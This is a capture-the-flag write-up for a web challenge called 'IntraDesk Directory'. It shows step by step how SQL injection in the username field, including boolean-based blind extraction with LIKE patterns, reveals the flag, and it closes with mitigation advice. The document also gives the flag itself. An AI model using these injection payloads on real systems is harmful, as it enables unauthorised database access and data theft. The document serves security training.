# IntraDesk Directory - CTF Challenge Writeup

## Challenge Information
- **Name:** IntraDesk Directory
- **Category:** Web Security
- **URL:** http://13.53.139.173/web1/
- **Description:** An internal directory search tool used by employees to look up user accounts. Search results appear to be limited, and some inputs may be filtered.

## Summary

| Item | Value |
|------|-------|
| **Vulnerability** | SQL Injection |
| **Flag** | `flag{sqli_w3bflag_f0und}` |

---

## Analysis

### Initial Reconnaissance

The application is an "IntraDesk Directory" - a web-based employee directory search tool. The interface allows searching by:
- Username
- Department (dropdown)
- Office (dropdown)

The page mentions:
- "Search results appear to be limited"
- "Some inputs may be filtered"
- "Some query patterns may be blocked automatically"

### Testing the Application

Initial testing revealed three valid users:
- `admin`
- `guest`
- `alice`

The username field appeared to be strictly filtered - wildcards like `*` were blocked, and special characters caused the search to return no results.

### Discovering SQL Injection

After testing various injection patterns, I discovered that the application was vulnerable to SQL injection in the `user` parameter. The key finding was that SQL-style string comparison worked:

```
' OR '1'='1
```

This payload returned a result, indicating SQL injection was possible.

### Understanding the Query Structure

Through testing, I determined:
1. The query uses a column named `username` for user lookup
2. There is a `password` column in the database
3. The query structure appears to be: `SELECT * FROM users WHERE username = '$input'`

Testing:
```
' OR username='admin     -> Returns result (column confirmed)
' OR password LIKE '%    -> Returns result (password column exists)
```

### Extracting the Flag

Using boolean-based blind SQL injection with LIKE patterns, I extracted the flag character by character:

1. First, confirmed the flag prefix:
   ```
   ' OR password LIKE 'flag{%    -> True
   ```

2. Then extracted each character:
   ```
   ' OR password LIKE 'flag{s%    -> True
   ' OR password LIKE 'flag{sq%   -> True
   ' OR password LIKE 'flag{sql%  -> True
   ... and so on
   ```

3. Finally verified the complete flag:
   ```
   ' OR password = 'flag{sqli_w3bflag_f0und}    -> True
   ```

---

## Exploitation Steps

1. **Identify vulnerability:** Test `' OR '1'='1` in the username field
2. **Discover columns:** Test `' OR password LIKE '%` to confirm password column
3. **Extract flag:** Use LIKE pattern matching to extract characters:
   - Start with `' OR password LIKE 'flag{%`
   - Iterate through characters to build the complete flag
4. **Verify:** Test exact match with `' OR password = 'flag{sqli_w3bflag_f0und}'`

## Solution Code

See `solution.py` for an automated solution that:
1. Demonstrates the vulnerability
2. Extracts the flag character by character
3. Verifies the complete flag

---

## Flag

```
flag{sqli_w3bflag_f0und}
```

---

## Key Takeaways

1. **Input filtering bypass:** While wildcards were blocked in normal queries, SQL injection allowed bypassing these filters
2. **Blind SQL injection:** Without direct output of query results, boolean-based extraction was required
3. **LIKE pattern matching:** The LIKE operator was useful for character-by-character extraction

## Mitigation Recommendations

1. Use parameterized queries/prepared statements
2. Implement proper input validation and sanitization
3. Use an ORM that handles SQL escaping
4. Apply the principle of least privilege for database users
5. Don't store sensitive data (like flags/passwords) in plaintext
